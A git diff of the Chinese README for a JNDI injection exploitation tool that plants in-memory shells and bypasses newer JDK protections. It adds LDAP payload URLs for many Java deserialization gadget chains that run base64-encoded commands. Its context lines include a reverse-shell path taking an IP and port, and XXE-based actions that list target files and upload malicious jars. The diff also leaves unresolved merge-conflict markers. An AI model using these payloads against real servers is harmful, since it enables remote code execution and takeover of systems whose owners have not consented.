@@ -2,10 +2,6 @@
 
 一款用于 ```JNDI注入``` 利用的工具，大量参考/引用了 ```Rogue JNDI``` 项目的代码，支持直接```植入内存shell```，并集成了常见的```bypass 高版本JDK```的方式，适用于与自动化工具配合使用。
 
-对大佬的项目https://github.com/WhiteHSBG/JNDIExploit 做了一点点些微的优化，加了CC6，RMI，还对回显做了一点优化。
-
-后面学习到了新的链子，也会往里面加进去。
-
 ---
 
 ## 👮免责声明
@@ -74,6 +70,15 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/C3P092/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Click1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/AspectJWeaver/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3183/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/BeanShell1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2NOCC/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1183NOCC/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
@@ -145,6 +150,7 @@ Supported LADP Queries：
   * ```Jre8u20```
   * ```CVE_2020_2551```
   * ```CVE_2020_2883```
+<<<<<<< HEAD
   * ```AspectJWeaver```
   * ```BeanShell1```
   * ```C3P092```
@@ -155,6 +161,17 @@ Supported LADP Queries：
   * ```CommonsBeanutils3183```
   * ```CommonsBeanutils1183NOCC```
 
+=======
+  *```AspectJWeaver```
+  *```BeanShell1```
+  *```C3P092```
+  *```Click1```
+  *```Clojure```
+  *```CommonsBeanutils2NOCC```
+  *```CommonsBeanutils3```
+  *```CommonsBeanutils3183```
+  *```CommonsBeanutils1183NOCC```
+>>>>>>> fbe62227bc24fe252b0c73374756b52b3d8b3541
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
